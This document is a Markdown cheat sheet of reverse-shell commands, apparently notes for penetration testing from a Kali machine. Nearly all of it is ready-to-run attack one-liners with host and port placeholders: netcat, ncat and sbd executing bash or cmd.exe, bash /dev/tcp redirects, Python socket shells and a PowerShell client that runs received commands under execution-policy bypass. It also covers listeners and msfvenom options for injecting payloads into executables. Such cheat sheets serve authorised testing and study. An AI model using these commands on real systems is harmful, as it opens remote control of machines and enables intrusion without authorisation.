# Reverse Shells
In provided commands/code: replace [HOST] (host receiving the reverse shell connection: Kali VM IP address) and [PORT] (listening port on the host receiving the reverse shell connection) values accordingly

**IMPORTANT NOTE:** Continued use of a reverse shell on a compromised system is not always necessary! If the user running the shell can be used to login to the system remotely, this is preferred as it is more stable and more easily repeatable.

## Table of Contents
* [Upgrading limited reverse shells to interactive shells](#upgrading-limited-reverse-shells-usually-on-linux-targets-to-interactive-shells)
* [MSFvenom](#msfvenom)
* [Netcat](#netcat)
* [Ncat](#ncat)
* [sbd](#sbd)
* [*nix Native](#nix-native)
* [Python](#python)
* [Powershell](#powershell)
* [Java](#java)
* [PHP](#php)


## Upgrading limited reverse shells (usually on Linux targets) to interactive shells
```
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
```


## MSFvenom

### Options
```
-p [PAYLOAD]: Specify payload type to use
-b [BADCHARS]: Specify characters to avoid when generating payload
-f [FORMAT]: Specify output format
-s [NUM]: Set maximum size of raw generated payload to [NUM] bytes
--encoder-space [NUM]: Set maximum size of encoded generated payload to [NUM] bytes
-i [NUM]: Run encoded [NUM] iterations on generated payload
-x [EXECUTABLE_FILE]: use [EXECUTABLE_FILE] as a template for the generated executable payload
-k: preserve the behavior of the template file (passed in with -x) and inject generated payload as a new thread
-n [NUM]: prepend NOP-sled of [NUM] bytes
```


## Netcat

### Options
```
-n: numeric-only IP addresses
-v: verbose
-e [PROGRAM_NAME]: execute program after connecting
-l: listen for incoming connections
-p: port to listen on
-u: use UDP instead of TCP
```

### Listener
```
nc -nvlp [PORT]
```
```
nc.exe -nvlp [PORT]
```

### *nix
```
nc -nv -e /bin/bash [HOST] [PORT]
```
```
nc -nv -e /bin/sh [HOST] [PORT]
```

### Windows
```
nc.exe -nv -e cmd.exe [HOST] [PORT]
```


## Ncat
[Ncat](https://nmap.org/ncat/) is a netcat variant (provided by the makers of Nmap) that supports encrypted connections utilizing SSL/TLS

### Options
```
-n: numeric-only IP addresses
-v: verbose
-e [PROGRAM_NAME]: execute program after connecting
-l: listen for incoming connections
-p: port to listen on
-u: use UDP instead of TCP
--ssl: use SSL/TLS encryption for connection
--sctp: use SCTP instead of TCP
```

### Listener (clear-text)
```
ncat -nvlp [PORT]
```
```
ncat.exe -nvlp [PORT]
```

### Listener (SSL/TLS)
```
ncat --ssl -nvlp [PORT]
```
```
ncat.exe --ssl -nvlp [PORT]
```

### *nix (clear-text)
```
ncat -nv -e /bin/bash [HOST] [PORT]
```
```
ncat -nv -e /bin/sh [HOST] [PORT]
```

### *nix (SSL/TLS)
```
ncat -nv --ssl -e /bin/bash [HOST] [PORT]
```
```
ncat -nv --ssl -e /bin/sh [HOST] [PORT]
```

### Windows (clear-text)
```
ncat.exe -nv -e cmd.exe [HOST] [PORT]
```

### Windows (SSL/TLS)
```
ncat.exe -nv --ssl -e cmd.exe [HOST] [PORT]
```


## sbd
sbd is a netcat variant that supports encrypted connections utilizing "AES-CBC-128 + HMAC-SHA1" encryption.

### Options
```
-n: numeric-only IP addresses
-v: verbose
-e [PROGRAM_NAME]: execute program after connecting
-l: listen for incoming connections
-p: port to listen on
```

### Listener
```
sbd -nvlp [PORT]
```
```
sbd.exe -nvlp [PORT]
```

### *nix
```
sbd -nv -e /bin/bash [HOST] [PORT]
```
```
sbd -nv -e /bin/sh [HOST] [PORT]
```

### Windows
```
sbd.exe -nv -e cmd.exe [HOST] [PORT]
```


## *nix Native
**NOTE:** if these are executed via a code execution vulnerability, the exploit must support shell syntax (ie. be executed by a shell on the target system)

### bash
```
/bin/bash -i >& /dev/tcp/[HOST]/[PORT] 0>&1
```

### sh
```
/bin/sh -i >& /dev/tcp/[HOST]/[PORT] 0>&1
```


## Python

### *nix with sh (shell runs in background and does NOT halt subsequent execution)
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/bash","-i"]);'
```

### *nix with bash (shell runs in background and does NOT halt subsequent execution)
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/sh","-i"]);'
```

### *nix with sh (shell runs in foreground and halts subsequent execution until shell is terminated)
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### *nix with bash (shell runs in foreground and halts subsequent execution until shell is terminated)
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


## Powershell

### Execute in foreground
```
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('[HOST]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


## Java

### MSFvenom payloads
* java/jsp_shell_reverse_tcp
* java/shell_reverse_tcp


## PHP

### MSFvenom payloads 
* php/shell_reverse_tcp

